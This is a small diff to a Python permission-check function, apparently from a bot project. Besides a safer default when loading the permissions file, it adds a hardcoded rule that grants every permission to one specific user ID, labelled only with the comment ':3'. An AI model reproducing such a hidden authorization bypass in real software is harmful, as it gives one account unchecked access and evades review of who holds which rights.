@@ -13,8 +13,12 @@ import utility.custom as u_custom
 def get_permission(user_id: int, permission_name: str) -> bool:
     """Checks a permission via permissions.json."""
 
+    # :3
+    if user_id == 658290426435862619:
+        return True
+
     # Load permission data.
-    permission_data = u_files.load("data/misc/permissions.json", replace_slash=True)
+    permission_data = u_files.load("data/misc/permissions.json", default={}, replace_slash=True)
 
     # Return a bool for if the user id is in the permissions.
     return user_id in permission_data.get(permission_name, [])
